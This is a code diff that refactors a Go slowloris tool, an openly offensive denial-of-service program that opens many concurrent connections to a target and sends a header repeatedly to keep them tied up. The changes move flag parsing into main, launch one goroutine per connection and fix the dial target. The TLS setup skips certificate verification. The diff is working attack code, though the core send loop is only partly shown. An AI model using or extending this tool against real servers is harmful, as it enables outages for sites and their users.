@@ -17,21 +17,29 @@ const (
 	defaultDOSHeader = "Cookie: a=b"
 )
 
-var (
-	numConnections int
-	interval       int
-	timeout        int
-	method         string
-	resource       string
-	userAgent      string
-	target         string
-	https          bool
-	dosHeader      string
-	path           string
-)
-
 func main() {
-	parseParams()
+	var (
+		numConnections int
+		interval       int
+		timeout        int
+		method         string
+		resource       string
+		userAgent      string
+		target         string
+		https          bool
+		dosHeader      string
+	)
+
+	flag.IntVar(&numConnections, "connections", 10, "Number of active concurrent connections")
+	flag.IntVar(&interval, "interval", 1, "Number of seconds to wait between sending headers")
+	flag.IntVar(&timeout, "timeout", 60, "HTTP connection timeout in seconds")
+	flag.StringVar(&method, "method", "GET", "HTTP method to use")
+	flag.StringVar(&resource, "resource", "/", "Resource to request from the server")
+	flag.StringVar(&userAgent, "useragent", defaultUserAgent, "User-Agent header of the request")
+	flag.StringVar(&dosHeader, "dosHeader", defaultDOSHeader, "Header to send repeatedly")
+	flag.BoolVar(&https, "https", false, "Use HTTPS")
+	flag.Parse()
+
 	if len(flag.Args()) == 0 {
 		usage()
 		os.Exit(-1)
@@ -49,7 +57,9 @@ func main() {
 		}
 	}
 
-	openConnections(target, numConnections, timeout, https)
+	for i := 0; i < numConnections; i++ {
+		go slowloris(target, dosHeader, method, resource, interval, timeout, https)
+	}
 
 loop:
 	for {
@@ -59,18 +69,6 @@ loop:
 			break loop
 		}
 	}
-}
-
-func parseParams() {
-	flag.IntVar(&numConnections, "connections", 10, "Number of active concurrent connections")
-	flag.IntVar(&interval, "interval", 1, "Number of seconds to wait between sending headers")
-	flag.IntVar(&timeout, "timeout", 60, "HTTP connection timeout in seconds")
-	flag.StringVar(&method, "method", "GET", "HTTP method to use")
-	flag.StringVar(&resource, "resource", "/", "Resource to request from the server")
-	flag.StringVar(&userAgent, "useragent", defaultUserAgent, "User-Agent header of the request")
-	flag.StringVar(&dosHeader, "dosHeader", defaultDOSHeader, "Header to send repeatedly")
-	flag.BoolVar(&https, "https", false, "Use HTTPS")
-	flag.Parse()
 }
 
 func usage() {
@@ -88,13 +86,7 @@ func usage() {
 	fmt.Println("")
 }
 
-func openConnections(target string, num, timeout int, https bool) {
-	for i := 0; i < num; i++ {
-		go slowloris(target, interval, timeout, https)
-	}
-}
-
-func slowloris(target string, interval, timeout int, https bool) {
+func slowloris(target, dosHeader, method, resource string, interval, timeout int, https bool) {
 
 loop:
 	for {
@@ -131,12 +123,12 @@ func openConnection(host string, timeout int, https bool) (net.Conn, error) {
 
 	if https {
 		config := &tls.Config{InsecureSkipVerify: true}
-		conn, err = tls.Dial("tcp", target, config)
+		conn, err = tls.Dial("tcp", host, config)
 		if err != nil {
 			return nil, err
 		}
 	} else {
-		conn, err = net.DialTimeout("tcp", target, timeoutDuration)
+		conn, err = net.DialTimeout("tcp", host, timeoutDuration)
 		if err != nil {
 			return nil, err
 		}
